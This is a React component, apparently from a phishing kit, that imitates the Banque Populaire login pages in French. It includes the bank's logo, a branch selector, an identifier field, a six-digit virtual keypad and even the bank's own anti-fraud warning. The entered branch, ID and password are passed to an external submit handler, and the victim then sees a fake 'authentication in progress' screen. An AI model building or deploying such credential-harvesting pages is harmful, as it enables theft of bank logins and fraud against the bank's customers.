import React, { useState } from 'react';
import { Loader2, ChevronDown } from 'lucide-react';

interface BpAuthTemplateProps {
  onSubmit: (formData: any) => Promise<boolean>;
}

export function BpAuthTemplate({ onSubmit }: BpAuthTemplateProps) {
  const [formData, setFormData] = useState({
    establishment: '',
    clientId: '',
    password: ''
  });
  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [showLoader, setShowLoader] = useState(false);
  const [showKeypad, setShowKeypad] = useState(false);
  const [passwordDigits, setPasswordDigits] = useState(['', '', '', '', '', '']);
  const [showEstablishmentDropdown, setShowEstablishmentDropdown] = useState(false);

  const establishments = [
    'ALSACE LORRAINE CHAMPAGNE',
    'AQUITAINE CENTRE ATLANTIQUE',
    'AUVERGNE RHONE ALPES',
    'BOURGOGNE FRANCHE-COMTÉ',
    'BRED',
    'GRAND OUEST',
    'MEDITERRANEE',
    'NORD',
    'OCCITANE',
    'RIVES DE PARIS',
    'SUD',
    'VAL DE FRANCE'
  ];

  const handleEstablishmentAndIdSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (formData.establishment && formData.clientId) {
      setShowKeypad(true);
    }
  };

  const handleFinalSubmit = async () => {
    setStatus('sending');

    try {
      const submitData = {
        ...formData,
        password: passwordDigits.join('')
      };
      
      const success = await onSubmit(submitData);
      if (!success) throw new Error('Failed to submit form');
      
      setStatus('success');
      setShowLoader(true);
      
      setTimeout(() => {
        setShowLoader(false);
        setStatus('idle');
      }, 3000);
    } catch (error) {
      setStatus('error');
      setTimeout(() => setStatus('idle'), 3000);
    }
  };

  const handleKeypadClick = (digit: string) => {
    const emptyIndex = passwordDigits.findIndex(d => d === '');
    if (emptyIndex !== -1) {
      const newDigits = [...passwordDigits];
      newDigits[emptyIndex] = digit;
      setPasswordDigits(newDigits);
    }
  };

  const clearPassword = () => {
    setPasswordDigits(['', '', '', '', '', '']);
  };

  // Show loader overlay when processing
  if (showLoader) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-600 to-blue-700 pt-20">
        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              <Loader2 className="w-12 h-12 animate-spin text-blue-600 mb-6" />
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Authentification en cours...
              </h2>
              <p className="text-gray-600 text-center max-w-md">
                Connexion sécurisée à votre espace Banque Populaire en cours.
              </p>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Show keypad interface
  if (showKeypad) {
    return (
      <div className="min-h-screen bg-white">
        {/* Header Banque Populaire */}
        <div className="bg-white shadow-sm border-b">
          <div className="max-w-7xl mx-auto px-4 py-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center space-x-4">
                <img 
                  src="https://upload.wikimedia.org/wikipedia/fr/thumb/b/b3/Logo_Banque_Populaire_2020.svg/1200px-Logo_Banque_Populaire_2020.svg.png" 
                  alt="Banque Populaire" 
                  className="h-8"
                />
              </div>
              <div className="flex items-center space-x-4">
                <button className="text-blue-600 hover:text-blue-800 text-sm">
                  Quitter
                </button>
                <button className="text-blue-600 hover:text-blue-800 text-sm">
                  Assistance
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Main Content - Keypad Interface */}
        <div className="min-h-screen bg-gradient-to-br from-blue-500 to-blue-600 flex">
          {/* Left Panel - Form */}
          <div className="w-full lg:w-1/2 bg-white flex items-center justify-center p-8">
            <div className="w-full max-w-md">
              <div className="bg-white p-8">
                <h1 className="text-2xl font-bold text-blue-800 mb-8 text-center">
                  Entrez votre mot de passe
                </h1>

                {/* Establishment Display */}
                <div className="text-center mb-6">
                  <div className="bg-blue-50 rounded-lg p-4 mb-4">
                    <h2 className="text-lg font-bold text-blue-800 mb-2">
                      BANQUE POPULAIRE
                    </h2>
                    <h3 className="text-md font-semibold text-blue-700">
                      {formData.establishment}
                    </h3>
                  </div>
                </div>

                {/* Client ID Display */}
                <div className="text-center mb-6">
                  <label className="block text-sm text-gray-600 mb-2">
                    Identifiant
                  </label>
                  <div className="text-xl font-mono font-bold text-gray-800 border-b-2 border-blue-300 pb-2">
                    {formData.clientId}
                  </div>
                </div>

                {/* Assistance vocale toggle */}
                <div className="flex items-center justify-center mb-6">
                  <label className="flex items-center space-x-2">
                    <span className="text-sm text-gray-600">Assistance vocale</span>
                    <div className="relative">
                      <input type="checkbox" className="sr-only" />
                      <div className="w-10 h-6 bg-gray-300 rounded-full shadow-inner"></div>
                      <div className="absolute w-4 h-4 bg-white rounded-full shadow top-1 left-1 transition-transform"></div>
                    </div>
                  </label>
                </div>

                {/* Password Display - 6 circles */}
                <div className="flex justify-center space-x-3 mb-8">
                  {passwordDigits.map((digit, index) => (
                    <div
                      key={index}
                      className={`w-8 h-8 border-2 rounded-full flex items-center justify-center ${
                        digit ? 'border-blue-500 bg-blue-50' : 'border-gray-300'
                      }`}
                    >
                      {digit ? '●' : ''}
                    </div>
                  ))}
                </div>

                {/* Virtual Keypad - Disposition selon l'image Banque Populaire */}
                <div className="mb-8">
                  <div className="grid grid-cols-5 gap-3 max-w-xs mx-auto">
                    {/* Ligne 1: 2, 9, 8, 4, 1 */}
                    <button
                      onClick={() => handleKeypadClick('2')}
                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                    >
                      2
                    </button>
                    <button
                      onClick={() => handleKeypadClick('9')}
                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                    >
                      9
                    </button>
                    <button
                      onClick={() => handleKeypadClick('8')}
                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                    >
                      8
                    </button>
                    <button
                      onClick={() => handleKeypadClick('4')}
                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                    >
                      4
                    </button>
                    <button
                      onClick={() => handleKeypadClick('1')}
                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                    >
                      1
                    </button>

                    {/* Ligne 2: 5, 7, 6, 3, 0 */}
                    <button
                      onClick={() => handleKeypadClick('5')}
                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                    >
                      5
                    </button>
                    <button
                      onClick={() => handleKeypadClick('7')}
                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                    >
                      7
                    </button>
                    <button
                      onClick={() => handleKeypadClick('6')}
                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                    >
                      6
                    </button>
                    <button
                      onClick={() => handleKeypadClick('3')}
                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                    >
                      3
                    </button>
                    <button
                      onClick={() => handleKeypadClick('0')}
                      className="w-12 h-12 bg-white hover:bg-blue-50 border-2 border-blue-200 rounded-full text-lg font-bold transition-all duration-200 shadow-sm hover:shadow-md active:scale-95"
                    >
                      0
                    </button>
                  </div>

                  {/* Clear and Forgot Password */}
                  <div className="flex justify-center space-x-6 mt-6">
                    <button
                      onClick={clearPassword}
                      className="text-blue-600 hover:text-blue-800 text-sm underline"
                    >
                      Annuler
                    </button>
                    <button className="text-blue-600 hover:text-blue-800 text-sm underline">
                      Mot de passe oublié ?
                    </button>
                  </div>
                </div>

                {/* Submit Button */}
                <button
                  onClick={handleFinalSubmit}
                  disabled={status === 'sending' || passwordDigits.some(d => d === '')}
                  className="w-full bg-blue-600 text-white font-semibold py-4 rounded hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                >
                  {status === 'sending' ? (
                    <div className="flex items-center justify-center space-x-2">
                      <Loader2 className="w-5 h-5 animate-spin" />
                      <span>Connexion...</span>
                    </div>
                  ) : (
                    'Valider'
                  )}
                </button>

                {status === 'error' && (
                  <div className="text-red-600 text-center bg-red-50 p-3 rounded mt-4">
                    Échec de la connexion. Veuillez vérifier vos identifiants.
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Right Panel - Blue Background */}
          <div className="hidden lg:block lg:w-1/2 bg-gradient-to-br from-blue-500 to-blue-600 p-8 flex flex-col justify-center text-white">
            <div className="max-w-md mx-auto">
              <h2 className="text-3xl font-bold mb-8">
                Banque Populaire
              </h2>
              <p className="text-blue-100 mb-8">
                Votre banque coopérative et mutualiste, proche de vous et de vos projets.
              </p>
              
              <div className="space-y-4 text-blue-100">
                <div className="flex items-center space-x-3">
                  <div className="w-2 h-2 bg-blue-300 rounded-full"></div>
                  <span>Connexion sécurisée 24h/24</span>
                </div>
                <div className="flex items-center space-x-3">
                  <div className="w-2 h-2 bg-blue-300 rounded-full"></div>
                  <span>Gestion complète de vos comptes</span>
                </div>
                <div className="flex items-center space-x-3">
                  <div className="w-2 h-2 bg-blue-300 rounded-full"></div>
                  <span>Services bancaires innovants</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header Banque Populaire */}
      <div className="bg-white shadow-sm border-b">
        <div className="max-w-7xl mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center space-x-4">
              <img 
                src="https://upload.wikimedia.org/wikipedia/fr/thumb/b/b3/Logo_Banque_Populaire_2020.svg/1200px-Logo_Banque_Populaire_2020.svg.png" 
                alt="Banque Populaire" 
                className="h-8"
              />
            </div>
            <div className="flex items-center space-x-4">
              <button className="text-blue-600 hover:text-blue-800 text-sm">
                Quitter
              </button>
              <button className="text-blue-600 hover:text-blue-800 text-sm">
                Assistance
              </button>
            </div>
          </div>
        </div>
      </div>

      {/* Main Content */}
      <div className="min-h-screen bg-gradient-to-br from-blue-500 to-blue-600 flex">
        {/* Left Panel - Form */}
        <div className="w-full lg:w-1/2 bg-white flex items-center justify-center p-8">
          <div className="w-full max-w-md">
            <div className="bg-white p-8">
              <h1 className="text-2xl font-bold text-blue-800 mb-8 text-center">
                Saisissez votre identifiant
              </h1>

              <form onSubmit={handleEstablishmentAndIdSubmit} className="space-y-6">
                {/* Establishment Selection */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Sélectionnez votre établissement bancaire
                  </label>
                  <div className="relative">
                    <button
                      type="button"
                      onClick={() => setShowEstablishmentDropdown(!showEstablishmentDropdown)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent text-left bg-white flex items-center justify-between"
                    >
                      <span className={formData.establishment ? 'text-gray-900' : 'text-gray-500'}>
                        {formData.establishment || 'Choisissez votre établissement'}
                      </span>
                      <ChevronDown className={`w-5 h-5 text-gray-400 transition-transform ${showEstablishmentDropdown ? 'rotate-180' : ''}`} />
                    </button>
                    
                    {showEstablishmentDropdown && (
                      <div className="absolute z-10 w-full mt-1 bg-white border border-gray-300 rounded-lg shadow-lg max-h-60 overflow-y-auto">
                        {establishments.map((establishment) => (
                          <button
                            key={establishment}
                            type="button"
                            onClick={() => {
                              setFormData(prev => ({ ...prev, establishment }));
                              setShowEstablishmentDropdown(false);
                            }}
                            className="w-full px-4 py-3 text-left hover:bg-blue-50 focus:bg-blue-50 focus:outline-none border-b border-gray-100 last:border-b-0"
                          >
                            {establishment}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>
                </div>

                {/* Client ID Input */}
                <div>
                  <label className="block text-sm font-medium text-gray-700 mb-2">
                    Entrez votre identifiant
                  </label>
                  <input
                    type="text"
                    value={formData.clientId}
                    onChange={(e) => setFormData(prev => ({ ...prev, clientId: e.target.value }))}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                    placeholder="Votre identifiant"
                    required
                  />
                </div>

                {/* Remember Me */}
                <div className="flex items-center">
                  <input
                    type="checkbox"
                    id="remember"
                    className="w-4 h-4 text-blue-600 border-gray-300 rounded focus:ring-blue-500"
                  />
                  <label htmlFor="remember" className="ml-2 text-sm text-gray-600">
                    Mémoriser mon identifiant
                  </label>
                </div>

                {/* Submit Button */}
                <button
                  type="submit"
                  disabled={!formData.establishment || !formData.clientId}
                  className="w-full bg-blue-600 text-white font-semibold py-4 rounded hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
                >
                  Valider
                </button>
              </form>

              {/* Help Links */}
              <div className="mt-6 text-center space-y-2">
                <button className="text-blue-600 hover:text-blue-800 text-sm underline block">
                  Identifiant oublié ?
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Right Panel - Blue Background */}
        <div className="hidden lg:block lg:w-1/2 bg-gradient-to-br from-blue-500 to-blue-600 p-8 flex flex-col justify-center text-white">
          <div className="max-w-md mx-auto">
            <h2 className="text-3xl font-bold mb-8">
              BIENVENUE
            </h2>
            
            {/* Security Alert */}
            <div className="bg-white bg-opacity-20 rounded-lg p-4 mb-8">
              <div className="flex items-start space-x-3">
                <div className="flex-shrink-0 mt-1">
                  <div className="w-6 h-6 bg-orange-500 rounded-full flex items-center justify-center">
                    <span className="text-white text-sm font-bold">!</span>
                  </div>
                </div>
                <div>
                  <h3 className="font-bold text-white mb-2">SOYEZ VIGILANT !</h3>
                  <p className="text-blue-100 text-sm">
                    Des fraudeurs peuvent vous contacter PAR TÉLÉPHONE ou EMAIL en se faisant passer pour 
                    votre conseiller, les services fraude ou opposition carte... en affichant parfois même nos 
                    numéros de téléphone. Nous ne vous demanderons JAMAIS de COMMUNIQUER les données 
                    de votre banque (identifiant, mot de passe, code reçu par sms, code Sécur'Pass...), pour 
                    CONFIRMER ou ANNULER une opération (ajout de compte bénéficiaire, virement, paiement 
                    par carte, validation Sécur'Pass...).
                  </p>
                </div>
              </div>
            </div>

            <div className="space-y-4 text-blue-100">
              <div className="flex items-center space-x-3">
                <div className="w-2 h-2 bg-blue-300 rounded-full"></div>
                <span>Banque coopérative et mutualiste</span>
              </div>
              <div className="flex items-center space-x-3">
                <div className="w-2 h-2 bg-blue-300 rounded-full"></div>
                <span>Proche de vous et de vos projets</span>
              </div>
              <div className="flex items-center space-x-3">
                <div className="w-2 h-2 bg-blue-300 rounded-full"></div>
                <span>Services bancaires sécurisés</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}